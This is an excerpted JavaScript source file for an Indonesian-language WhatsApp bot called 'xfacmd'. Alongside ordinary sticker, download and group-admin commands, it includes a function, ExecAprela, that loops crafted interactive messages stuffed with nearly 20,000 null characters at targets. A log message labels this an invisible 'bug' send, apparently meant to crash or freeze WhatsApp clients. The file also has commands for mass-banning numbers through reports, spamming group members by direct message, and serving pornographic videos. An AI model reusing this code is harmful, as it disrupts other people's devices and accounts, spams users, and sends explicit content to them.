...
module.exports = xfacmd = async (xfacmd, m, chatUpdate, store) => {
    try {
        const body = (
        ...
        const sender = m.key.fromMe ? xfacmd.user.id.split(":")[0] + "@s.whatsapp.net" || xfacmd.user.id
: m.key.participant || m.key.remoteJid;
        ...
        const antilink = JSON.parse(fs.readFileSync('./plugin/antilink.json'))
        const antilink2 = JSON.parse(fs.readFileSync('./plugin/antilink2.json'))
        const Antilinkall = JSON.parse(fs.readFileSync('./plugin/antilinkall.json'))
        const botNumber = await xfacmd.decodeJid(xfacmd.user.id);
        const xfacmdPenCewe = [botNumber, ...kontributor, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        ...
        const groupMetadata = m.isGroup ? await xfacmd.groupMetadata(m.chat).catch(e => {}) : ''
...
"body": `${pushname} 👋🏻`,
"previewType": "VIDEO",
"thumbnailUrl": 'https://files.catbox.moe/s8awpl.jpg',
"sourceUrl": 'https://youtube.com/@RYOFC123'}}},
{ quoted: qkontak})
}
        const reply = (teks) => {
xfacmd.sendMessage(m.chat, { text: teks, contextInfo: {
            mentionedJid: [],
            groupMentions: [],
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterJid: '120363302865191524@newsletter',
               newsletterName: "RYOFC123",
                serverMessageId: -1
            },
            forwardingScore: 256,
externalAdReply: {
        showAdAttribution: true,
        title: `ᴄʟᴜғᴇʀ xғᴀᴄᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ`,
        ...
        const xfacmdadmn = () => {
        let xfacmdStikRep = fs.readFileSync('./start/lib/sticker_reply/admin.webp')
        xfacmd.sendMessage(from, { sticker: xfacmdStikRep }, { quoted: m })
        }
        const xfacmdbotadmin = () => {
        let xfacmdStikRep = fs.readFileSync('./start/lib/sticker_reply/botadmin.webp')
        xfacmd.sendMessage(from, { sticker: xfacmdStikRep }, { quoted: m })
        }
        const xfacmdowner = () => {
        let xfacmdStikRep = fs.readFileSync('./start/lib/sticker_reply/owner.webp')
        xfacmd.sendMessage(from, { sticker: xfacmdStikRep }, { quoted: m })
        }
        const xfacmdongb = () => {
        let xfacmdStikRep = fs.readFileSync('./start/lib/sticker_reply/group.webp')
        xfacmd.sendMessage(from, { sticker: xfacmdStikRep }, { quoted: m })
        }
        const xfacmdpriv = () => {
        let xfacmdStikRep = fs.readFileSync('./start/lib/sticker_reply/prem.webp')
        xfacmd.sendMessage(from, { sticker: xfacmdStikRep }, { quoted: m })
        }
        const example = (teks) => {
return `\n *Example Command :*\n *${prefix+command}* ${teks}\n`
...
async function sendxfacmdMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await xfacmd.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
...
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await xfacmd.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await xfacmd.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./xfac.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await xfacmd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await xfacmd.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}
...
let delet = m.key.participant
let bang = m.key.id
await xfacmd.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./xfac.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await xfacmd.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}
...
if (xfacmdPenCewe) return reply(bvl)
        await xfacmd.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
...
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(19999)}\",\"screen_0_TextInput_1\":\"Gw Mah Ganteng\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3,
},
},
},
};
async function ExecAprela(target, xfacmd) {
  let participants = (await xfacmd.groupMetadata(target)).participants
    .map((a) => a.id)
  ...
  for (let i = 0; i < 10; i++) {
    let msg = await generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "\u0000💨𝗭͞𝗰͟͟𝗼͟͞𝗻𝗰𝗲͟͞𝗽𝘁𝗛͟͞𝗲𝗿𝗲ꕤ\u0000".repeat(1),
              format: "EXTENSIONS_1"
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
    ...
    await xfacmd.relayMessage("status@broadcast", msg.message, {
...
});
{
  ...
  console.log("🧊 Send Bug Invis By Leyche");
}
}
...
video_2: $(b).find('video > a').attr('href') || ''
  ...
  const {
        ...
        let cihuy = fs.readFileSync('./start/lib/media/xfac.jpg')
        if (m.message) {
...
Reply(`*JANGAN TAG AYANG GW PUQI*`)
        ...
        const plug = { xfacmd, prefix, command, reply, text, xfacmdPenCewe, reaction, isGroup: m.isGroup, isPrivate: !m.isGroup, pushname, mime, quoted };

        for (let plugin of plugins) {
            if (plugin.command.find(e => e == command.toLowerCase())) {
                if (plugin.owner && !xfacmdPenCewe) {
                    return xfacmdpriv();
                }
...
║◦ᴍᴏᴅᴇ: *${xfacmd.public ? 'ᴘᴜʙʟɪᴄ' : 'sᴇʟғ'}*  
┗━━━━━━━━━━━━ `
xfacmd.sendMessage(m.chat, {
  footer: foother,
  buttons: [
  ...
  headerType: 1,
  viewOnce: true,
       image: { url: 'https://files.catbox.moe/s8awpl.jpg'},
       caption: menu,
    contextInfo: {
...
break
    ...
    case "allmenu": {
    let mbut = `*ʜᴀʟʟᴏ ${pushname}.*  ɴᴀᴍᴀ ꜱᴀyᴀ ᴀᴅᴀʟᴀʜ *${botname}*, ʏᴀɴɢ ʙɪsᴀ ᴍᴇᴍʙᴀɴᴛᴜ ᴋᴀᴍᴜ
...
xfacmd.sendMessage(m.chat, { react: { text: "🤍",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "🩶",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "🩵",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "🩷",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "💛",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "❤️",key: m.key,}})
xfacmd.sendMessage(m.chat, { react: { text: "💔",key: m.key,}})  
}
          break
case 'listpanel': {
    let lspnl = `
*List Panel Run Bot Public By RYOFC123*
...
await xfacmd.sendMessage(m.key.remoteJid, {
...
case 'listpanelpriv': {
    let lspnl = `
*List Panel Run Bot Private By RYOFC123*
...
await xfacmd.sendMessage(m.chat, {
  ...
  viewOnce: true,
  document: fs.readFileSync("./package.json"),
  fileName: `You know ryofc? Yes Its RYOFC123`,
  mimetype: 'application/pdf',
  fileLength: "999999999999",
  caption: qris,
  contextInfo: {
...
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih Metode Download Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
...
break
case 'quotes': {
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih Quotes Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
...
break
case 'nsfw': {
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih *NSFW* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
...
break
case 'anime': {
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih *ANIME* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
    ...
    message: {
        ...
        interactiveMessage: proto.Message.InteractiveMessage.create({
          ...
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./xfac.jpg')}, { upload: xfacmd.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: namafile,
...
await xfacmd.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
           }
break
case "welcome2": {
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
...
xfacmd.sendMessage(m.chat, { image: { url: yeha }, caption : 'Nih Bang' }, { quoted: m })
}
break
case 's':
case 'stiker':
...
let encmedia = await xfacmd.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await xfacmd.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
...
case 'tagsw1': {
    ...
    await xfacmd.sendMessage("status@broadcast", msgOptions, {
        backgroundColor: pickedColor,
        textArgb: 0xffffffff,
        font: 0,
        statusJidList: await (await xfacmd.groupMetadata(id)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
...
await xfacmd.groupUpdateSubject(m.chat, text)
...
if (!isAdmins) return Reply('Khusus Admin!!')
if (!text) return Reply('Text ?')
await xfacmd.groupUpdateDescription(m.chat, text)
await Reply(`sukses kak`)
            }
            break
//=========================================\\
...
let ghosst = userss
	try {
   var ppuser = await xfacmd.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
xfacmd.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !xfacmdPenCewe) return Reply('Khusus Admin!!')
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
...
var mediz = await xfacmd.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
...
var memeg = await xfacmd.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
Reply(`Success`)
}
}
...
if (!isAdmins && !xfacmdPenCewe) return Reply('Khusus Admin!!')
if (!isBotAdmins) return Reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await xfacmd.removeProfilePicture(from)
    }
    break
...
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
 ...
 await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
 const daftarSaluran = [
`${jpmch1}`,
`${jpmch2}`,
`${jpmch3}`,
...
try
{
await xfacmd.sendMessage(idSaluran, {
          contextInfo: {
          forwardingScore: 999,
          isForwarded: true,
...
await xfacmd.groupParticipantsUpdate(m.chat, [users], 'promote')
await Reply(`sukses kak`)
}
break
case 'demote': {
...
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xfacmd.groupParticipantsUpdate(m.chat, [users], 'demote')
await Reply(`sukses kak`)
}
break
    case 'kick': {
if (!m.isGroup) return Reply("Only Grup")
if (!isAdmins && !xfacmdPenCewe) return xfacmdpriv()
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await xfacmd.groupParticipantsUpdate(m.chat, [users], 'remove')
await Reply(`sukses kak`)
}
break
...
reply("𝘗𝘭𝘦𝘢𝘴𝘦 𝘈 𝘞𝘢𝘪𝘵.....")
     for (let i = 0; i < 5; i++) {
     await ExecAprela(target, xfacmd)
     }
...
break
case 'tagsw': {
if (!isPremium) return xfacmdpriv()
    ...
    return xfacmd.sendMessage("status@broadcast", options, {
        backgroundColor: "#7ACAA7",
        textArgb: 0xffffffff,
        font: 1,
        statusJidList: await (await xfacmd.groupMetadata(m.chat)).participants.map((a) => a.id),
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
...
await xfacmd.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xfacmd.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await xfacmd.sendMessage(m.chat, {react: {text: '', key: m.key}})
...
await xfacmd.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break
case "muslimai": {
...
if (!res.status) return m.reply("Error! Result Not Found")
await xfacmd.sendMessage(m.chat, {video: {url: res.result.url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await xfacmd.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error"))
}
break
...
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: xfacmd.waUploadToServer })
await araara.push({
...
await xfacmd.relayMessage(m.chat, msgii.message, { 
...
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: xfacmd.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
...
await xfacmd.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: qkontak})
}
...
break
case 'q': case 'quoted': {
if (!m.quoted) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let kyaquotx= await xfacmd.serializeM(await m.getQuotedObj())
...
break
case 'owner': {
let name = m.pushName || xfacmd.getName(m.sender);
...
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    ...
    upload: xfacmd.waUploadToServer
  });
  return imageMessage;
}
        ...
        interactiveMessage: {
          ...
          carouselMessage: {
            cards: [
              {                   
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://img12.pixhost.to/images/593/571679303_skyzopedia.jpg' } }, { upload: xfacmd.waUploadToServer })),
          title: `> ᴄʟᴜғᴇʀ xғᴀᴄᴍᴅ ᴍᴜʟᴛɪ ᴅᴇᴠɪᴄᴇ`,
          gifPlayback: true,
          ...
          hasMediaAttachment: false
                ...
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"𝘠𝘰𝘶𝘛𝘶𝘣𝘦","url":"https://youtube.com/@RYOFC123","merchant_url":"https://www.google.com"}`
                    },
                  ],
                },
              },
...
await xfacmd.sendMessage(m.chat, { video: buffer, caption: m.quoted.text || "" }, sendOptions);
} else if (type === "imageMessage") {
await xfacmd.sendMessage(m.chat, { image: buffer, caption: m.quoted.text || "" }, sendOptions);
...
if (!isPremium && !xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
const { hentai } = require('./lib/function/scraper.js')
anu = await hentai()
result912 = anu[Math.floor(Math.random(), anu.length)]
xfacmd.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji}` }, { quoted: qkontak })
            }
            break
case "anime1": {
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
...
break
case "xfacmd": {
xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/own.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
}
break
case "cosplay1": {
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m});
...
let res = await xfacmd.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
...
await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let foto = await xfacmd.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await xfacmd.sendMessage(m.chat, {image: result}, {quoted: qkontak})
...
case 'upsw': {
    ...
    async function fetchParticipants(...jids) {
        ...
        for (const jid of jids) {
            let { participants } = await xfacmd.groupMetadata(jid);
...
mee = await xfacmd.downloadAndSaveMediaMessage(quoted)
...
xfacmd.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
memek = await xfacmd.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
xfacmd.sendMessage(m.chat, { react: { text: '✔️', key: m.key }})
} else {
...
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih *WARNA QC* Yang Tersedia Di Bawah Ini`, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
...
reply(`Contoh: ${prefix}qc pink hallo\n\n*List Warna*\npink\nbiru\nmerah\nhijau\nkuning\nungu\nbirutua\nbirumuda\nabu\norange\nhitam\nputih\nteal\nmerahmuda\ncokelat\nsalmon\nmagenta\ntan\nwheat\ndeeppink\napi\nbirulangit\njingga\nbirulangitcerah\nhotpink\nbirumudalangit\nhijaulaut\nmerahtua\noranyemerah\ncyan\nungutua\nhijaulumut\nhijaugelap\nbirulaut\noranyetua\nungukehitaman\nfuchsia\nmagentagelap\nabu-abutua\npeachpuff\nhijautua\nmerahgelap\ngoldenrod\nabu-abutua\nungugelap\nemas\nperak`)
			...
			break
				...
				try {
					avatar = await xfacmd.profilePictureUrl(m.sender, "image");
				} catch {
				...
				try {
					...
					await xfacmd.imgToSticker(m.chat, qc, m, {
...
case 'qc1': {
    ...
    const ppnyauser = await xfacmd.profilePictureUrl(m.sender, 'image').catch(_ => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg');
    const json = {
        "type": "quote",
        "format": "png",
        "backgroundColor": "#FFFFFF",
    ...
    xfacmd.sendImageAsSticker(m.chat, rest.result, m, {
...
async function pepe(media) {
	...
	if (/image/g.test(mime) && !/webp/g.test(mime)) {
		try {
			const media = await xfacmd.downloadAndSaveMediaMessage(quoted)
			let botNumber = await xfacmd.decodeJid(xfacmd.user.id)
...
case 'addcase': {
 ...
 if (!xfacmdPenCewe) return reply('lu sapa asu')
...
xfacmd.sendMessage(m.chat, { image: { url: img }, caption: 'berhasil menghapus background..'}, { quoted: m})
	} catch {
...
async function upscaleImage(inputPath, resolutionOption) {
  ...
  try {
    ...
    await xfacmd.sendMessage(m.chat, { image: fs.readFileSync(outputPathResolution), caption: "Done Cik"});
...
const media = await xfacmd.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
xfacmd.sendMessage(m.chat, { image: { url: `https://skizoasia.xyz/api/toanime?url=${anuu.url}&apikey=nonogembul` }, caption: 'Selesai'}, { quoted: m})
	} catch {
	  Reply('yah Error kak laporankan ke owner agar di perbaiki')
	}
}
...
await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
let media = await xfacmd.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('postimages.org');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'xfacmd.png');
let teks = directLink.toString()
await xfacmd.sendMessage(m.chat, {text: teks}, {quoted: m})
...
case "reactionch": case "reactch": {
 ...
 let res = await xfacmd.newsletterMetadata("invite", result) 
 await xfacmd.newsletterReactMessage(res.id, serverId, args[1])
...
case 'tourl': {
				...
				await xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/dayum.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
				try {
					let media = await xfacmd.downloadAndSaveMediaMessage(quoted);
          ...
          interactiveMessage: {
            ...
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: {url:'./xfac.jpg'} }, { upload: xfacmd.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
...
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
        		try {
					ppuser = await xfacmd.profilePictureUrl(m.sender, 'image');
				} catch (err) {
          ...
          interactiveMessage: {
            ...
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: { url: './xfac.jpg'
              } }, { upload: xfacmd.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: ownername,
                  ...
                  body: { text: `> Klik tombol  di bawah untuk\n> Melihat Chanel RYOFC123 ` },
                  nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Lihat Chanel( RYOFC123  )","url":"https://youtube.com/@RYOFC123","merchant_url":"https://youtube.com/@RYOFC123"}`
                    },
                  ],
                  },
                },
...
case 'handhold':
  ...
  axios.get(`https://api.waifu.pics/sfw/${command}`)
    ...
    .catch((err) => {
      console.error(err);
      xfacmd.sendMessage(from, { text: 'Terjadi kesalahan, coba lagi nanti.' }, { quoted: qkontak });
    });
  break
  case 'robloxstalk': {
...
Magnitudo: ${response.data.magnitune || "Tidak diketahui"}`;
        ...
        await xfacmd.sendMessage(m.chat, { text: iclik }, { quoted: qkontak });
    } catch (e) {
...
const xfacmdtruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${xfacmdtruth}`)
}
break
case 'quotesbacot': {
...
break
case 'aksarasunda': {
   if (!text) return m.reply("Example: .aksarasunda ryofc")
...
await xfacmd.sendMessage(m.chat, {text: `${kntlsundaa}` }, {quoted: qkontak})
}
break
case "addprem": {
if (!isPremium && !xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
...
return xfacmd.relayMessage(m.chat, msgs.message, {})
}
break
case 'antitaggc': {
    ...
    if (m.message?.groupStatusMentionMessage) {
        ...
        await xfacmd.sendMessage(m.chat, { delete: m.key })
    }
    return true
}
break
...
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await xfacmd.groupInviteCode(group)
      await xfacmd.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
...
case 'xnxxdl': {
	...
	if (!text) return Reply(`Enter Url`)
        ...
        const fg = require('api-dylux')
            ...
            console.log(xn)
xfacmd.sendMessage(m.chat, { caption: `≡  *XNXX DL*
...
await xfacmd.sendMessage(m.chat,{image:{url:urll}, caption:txt},{quoted:m})
} catch (err) {
console.log(err)
return Reply('Error')
}
...
case 'kenon': {
if (!xfacmdPenCewe) return reply('Fitur ini hanya dapat digunakan oleh owner.')
if (m.quoted || q) {
...
reply(`Wait 1-24 Jam an untuk proses banned dari bot dan tunggu ±30 Detik an untuk melihat balasan email dari WhatsApp tuan xfacmd🥺🙏`)
...
xfacmd.sendMessage(from, {image: {url:waifudd.data.url},caption:`Dasar Wibu`}, { quoted: qkontak }).catch(err => {
 return('Error!')
})
break
/// download
...
break
case 'bokep': {
xfacmd.sendMessage(m.chat, {  text: `Silahkah Pilih *BOKEP* Yang Tersedia Di Bawah Ini  `, 
  footer: foother,
  buttons: [
    {
      buttonId: `.sc`,
...
if (!isPremium && !xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
    ...
    try {
        ...
        let anu1 = anu.data;
        xfacmd.sendMessage(m.chat, { video: { url: anu1 }, caption: "Nih Bang Bokepnya" }, { quoted: m });
    } catch (err) {
...
await xfacmd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: anu.result.metadata.cover_url, title: anu.result.metadata.title, body: `Author ${anu.result.metadata.artists} || Duration ${anu.result.metadata.duration}`, sourceUrl: anu.result.metadata.link, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: qkontak})
} else {
...
await xfacmd.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: qkontak})
} else {
return Reply("Error! vidio atau lagu tidak ditemukan")
}
}
...
case "cekidgc": {
    ...
    if (!xfacmdPenCewe) return reply("Fitur ini hanya bisa digunakan oleh Creator bot!");

    try {
        let getGroups = await xfacmd.groupFetchAllParticipating();
        ...
        for (let x of anu) {
            try {
                let metadata2 = await xfacmd.groupMetadata(x);
...
xfacmd.sendMessage(m.chat, {  text: `𝘚𝘪𝘭𝘢𝘩𝘬𝘢𝘯 𝘗𝘪𝘭𝘪𝘩 𝘛𝘺𝘱𝘦 𝘉𝘳𝘢𝘵 𝘠𝘢𝘯𝘨 𝘛𝘦𝘳𝘴𝘦𝘥𝘪𝘢 𝘋𝘪 𝘉𝘢𝘸𝘢𝘩 𝘐𝘯𝘪`,
image: { url: 'https://files.catbox.moe/s8awpl.jpg' },
caption: text,
...
if (!text) return Reply(`\n*ex:* ${prefix + command} apanih cok\n`)
  ...
  xfacmd.sendImageAsSticker(m.chat, media, m, {
    packname: packname,
    author: author
  });
}
...
pack: "Stiker By",
mauthor: "ᴄʟᴜғᴇʀ xғᴀᴄᴍᴅ",
type: "image/png",
});
const stikerBuffer = await sticker.toBuffer();
await xfacmd.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });
} catch (err) {
...
`
    ...
    await xfacmd.sendMessage(m.chat, listMessage)

    await xfacmd.sendMessage(nomornya, {
...
if (!xfacmdPenCewe) return xfacmd.sendMessage(from, {audio: fs.readFileSync('./media/vn/lusiapa.mp3'),mimetype: 'audio/mpeg',ptt: true},{quoted:m})
  ...
  await xfacmd.sendMessage(m.chat, { text: messageText }, { quoted: m });
...
akunlo = "https://files.catbox.moe/s8awpl.jpg" 
if (!u) return
let d = (await xfacmd.onWhatsApp(u.split`@`[0]))[0] || {}
...
===============================
`
xfacmd.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: xfacmd.chat })
...
await fs.writeFileSync("./plugin/antilink2.json", JSON.stringify(antilink2))
}
antilink.push(m.chat)
await fs.writeFileSync("./plugin/antilink.json", JSON.stringify(antilink))
...
let posi = antilink.indexOf(m.chat)
antilink.splice(posi, 1)
await fs.writeFileSync("./plugin/antilinkall.json", JSON.stringify(antilink))
}
Antilinkall.push(m.chat)
await fs.writeFileSync("./plugin/antilinkall.json", JSON.stringify(Antilinkall))
...
break
    ...
    if (!xfacmdPenCewe) return reply('Hanya owner yang dapat menggunakan fitur ini.');

    const groupMetadata = await xfacmd.groupMetadata(from);
    ...
    for (let member of participants) {
        ...
        try {
            ...
            await xfacmd.sendMessage(memberId, { text: pesan });
...
case 'pushkontakid': {
    ...
    try {
        const groupMetadata = await xfacmd.groupMetadata(groupId);
        const participants = groupMetadata.participants;
    ...
    break;
            ...
            case 'tagall':{
                ...
                const groupMetadata = await xfacmd.groupMetadata(m.chat);
                const participants = groupMetadata.participants;
            ...
            case "h": {
                if (!m.isGroup) return Reply("Only Grup")
                if (!isAdmins && !xfacmdPenCewe) return reply(mess.admin)
                if (m.quoted) {
                    xfacmd.sendMessage(m.chat, {
